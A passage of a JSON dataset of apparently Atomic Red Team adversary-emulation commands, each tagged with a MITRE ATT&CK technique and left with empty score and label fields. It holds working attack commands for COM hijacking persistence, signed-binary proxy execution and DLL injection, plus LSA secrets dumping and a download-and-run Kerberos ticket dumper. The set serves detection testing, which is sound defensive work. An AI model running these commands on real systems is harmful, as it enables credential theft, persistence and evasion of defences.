        "Command": "ls -a >> /tmp/T1083.txt\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;\nfile */* *>> /tmp/T1083.txt\ncat /tmp/T1083.txt 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n",
        "Description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1083",
        "Shell": "sh"
    },
    {
        "ID": 571,
        "Command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt\nif [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;\nfind . -type f -iname *.pdf >> /tmp/T1083.txt\ncat /tmp/T1083.txt\nfind . -type f -name \".*\"\n",
        "Description": "Find or discover files on the file system\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1083",
        "Shell": "sh"
    },
    {
        "ID": 572,
        "Command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) \n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}\n}\ncat $env:temp\\T1083Test5.txt\n",
        "Description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1083",
        "Shell": "powershell"
    },
    {
        "ID": 573,
        "Command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n",
        "Description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1083",
        "Shell": "powershell"
    },
    {
        "ID": 574,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"PathToAtomicsFolder\\T1083\\src\\esxi_file_discovery.txt\"\n",
        "Description": "An adversary uses the find command to enumerate vmdks on an ESXi host.\n[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1083",
        "Shell": "command_prompt"
    },
    {
        "ID": 575,
        "Command": "echo \"Creating %systemroot%\\wpbbin.exe\"\\t  \nNew-Item -ItemType File -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"\n",
        "Description": "Creates Wpbbin.exe in %systemroot%. This technique can be used for UEFI-based pre-OS boot persistence mechanisms.\n- https://grzegorztworek.medium.com/using-uefi-to-inject-executable-files-into-bitlocker-protected-drives-8ff4ca59c94c\n- http://download.microsoft.com/download/8/a/2/8a2fb72d-9b96-4e2d-a559-4a27cf905a80/windows-platform-binary-table.docx\n- https://github.com/tandasat/WPBT-Builder\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1542.001",
        "Shell": "powershell"
    },
    {
        "ID": 576,
        "Command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",
        "Description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.015",
        "Shell": "powershell"
    },
    {
        "ID": 577,
        "Command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\"))\n$item = $o.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n",
        "Description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.015",
        "Shell": "powershell"
    },
    {
        "ID": 578,
        "Command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1546.015_calc.dll\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Both' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",
        "Description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.015",
        "Shell": "powershell"
    },
    {
        "ID": 579,
        "Command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"AtomicTest\" ",
        "Description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.015",
        "Shell": "powershell"
    },
    {
        "ID": 580,
        "Command": "mavinject.exe 1000 /INJECTRUNNING \"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\"\n",
        "Description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 581,
        "Command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"\n",
        "Description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 582,
        "Command": "InfDefaultInstall.exe \"PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\"\n",
        "Description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 583,
        "Command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx\"\n",
        "Description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 584,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\microsoft.workflow.compiler.exe \"PathToAtomicsFolder\\T1218\\src\\T1218.xml\" output.txt\n",
        "Description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "powershell"
    },
    {
        "ID": 585,
        "Command": "&\"PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe\" \"PathToAtomicsFolder\\T1218\\src\\T1218.xml\" output.txt\n",
        "Description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "powershell"
    },
    {
        "ID": 586,
        "Command": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD",
        "Description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "powershell"
    },
    {
        "ID": 587,
        "Command": "C:\\Windows\\System32\\diskshadow.exe -S PathToAtomicsFolder\\T1218\\src\\T1218.txt \n",
        "Description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "powershell"
    },
    {
        "ID": 588,
        "Command": "wuauclt.exe /UpdateDeploymentProvider \"PathToAtomicsFolder\\T1218\\bin\\calc.dll\" /RunHandlerComServer\n",
        "Description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 589,
        "Command": "Gpscript /logon\n",
        "Description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 590,
        "Command": "Gpscript /startup\n",
        "Description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 591,
        "Command": "copy c:\\windows\\system32\\ie4uinit.exe %TEMP%\\ie4uinit.exe\ncopy \"PathToAtomicsFolder\\T1218\\src\\ieuinit.inf\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n",
        "Description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 592,
        "Command": "if (-not (Test-Path C:\\test)) {\nNew-Item -Path C:\\test -ItemType Directory\n} else {\nWrite-Host \"Directory C:\\test already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"C:\\test\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"C:\\test\\explorer.exe\" -Force\nC:\\test\\customshellhost.exe\n",
        "Description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "powershell"
    },
    {
        "ID": 593,
        "Command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n",
        "Description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "command_prompt"
    },
    {
        "ID": 594,
        "Command": "$edgePath64 = \"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"\nif (Test-Path $edgePath64) {\n\\t$edgePath = $edgePath64\n} else {\n\\t# Check 32-bit Edge installation path\n\\t$edgePath32 = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\n\\tif (Test-Path $edgePath32) {\n\\t\\t$edgePath = $edgePath32\n\\t} else {\n\\t\\texit 1\n\\t}\n}\n& $edgePath --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\calc.exe &&\"\nsleep 5\ntaskkill -f -im msedge.exe\ntaskkill -f -im calc.exe\ntaskkill -f -im win32calc.exe\n",
        "Description": "Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn \"calc.exe\" as a child process of msedge.exe\n- https://lolbas-project.github.io/lolbas/Binaries/Msedge/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "powershell"
    },
    {
        "ID": 595,
        "Command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \"C:\\Windows\\System32\\calc.exe\"",
        "Description": "Use wlrmdr(Windows Logon Reminder executable) as a proxy binary to evade defensive countermeasures",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218",
        "Shell": "powershell"
    },
    {
        "ID": 596,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y\n",
        "Description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 597,
        "Command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  \n",
        "Description": "This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.\nIf the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.\nRef: https://github.com/MzHmO/PowershellKerberos/\nAuthor of dumper.ps1: Michael Zhmaylo (@MzHmO)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.004",
        "Shell": "powershell"
    },
    {
        "ID": 598,
        "Command": "takeown.exe /f %temp%\\T1222.001_takeown_folder /r\n",
        "Description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 599,
        "Command": "icacls.exe %temp%\\T1222.001_cacls /grant Everyone:F\n",
        "Description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 600,
        "Command": "attrib.exe -r %temp%\\T1222.001_attrib\\*.* /s\n",
        "Description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 601,
        "Command": "mkdir %temp%\\T1222.001_attrib_2 >nul 2>&1\necho T1222.001_attrib1 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt\nattrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt\nattrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt\n",
        "Description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 602,
        "Command": "icacls \"C:\\Users\\Public\\*\" /grant Everyone:F /T /C /Q",
        "Description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 603,
        "Command": "\"C:\\Program Files (x86)\\Windows Resource Kits\\Tools\\subinacl.exe\"",
        "Description": "This test simulates an adversary executing the Windows Resource kit utility SubInAcl. This utility was abused by adversaries in the past in order to modify access permissions. Upon execution, a process creation log should be generated indicating successful execution.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 604,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1\n",
        "Description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559",
        "Shell": "command_prompt"
    },
    {
        "ID": 605,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 2\n",
        "Description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559",
        "Shell": "command_prompt"
    },
    {
        "ID": 606,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 3\n",
        "Description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559",
        "Shell": "command_prompt"
    },
    {
        "ID": 607,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4\n",
        "Description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559",
        "Shell": "command_prompt"
    },
    {
        "ID": 608,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5\n",
        "Description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559",
        "Shell": "command_prompt"
    },
    {
        "ID": 609,
        "Command": "docker build -t t1613 $PathtoAtomicsFolder/T1613/src/\ndocker run --name t1613_container --rm -d -t t1613\ndocker ps\ndocker stats --no-stream\ndocker inspect $(docker ps -l -q --filter ancestor=t1613)",
        "Description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1613",
        "Shell": "sh"
    },
    {
        "ID": 610,
        "Command": "podman build -t t1613 $PathtoAtomicsFolder/T1613/src/\npodman run --name t1613_container --rm -d -t t1613\npodman ps\npodman stats --no-stream\npodman inspect $(podman ps -l -q --filter ancestor=t1613)",
        "Description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1613",
        "Shell": "sh"
    },
    {
        "ID": 611,
        "Command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f\nnet start spooler\nif(0){\n  Restart-Computer\n}\n",
        "Description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.012",
        "Shell": "powershell"
    },
    {
        "ID": 612,
        "Command": "net use c: \\\\test\\share\nnet share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No\n",
        "Description": "Add a Network Share utilizing the command_prompt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 613,
        "Command": "net share \\\\test\\share /delete\n",
        "Description": "Removes a Network Share utilizing the command_prompt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 614,
        "Command": "Remove-SmbShare -Name \\\\test\\share\nRemove-FileShare -Name \\\\test\\share\n",
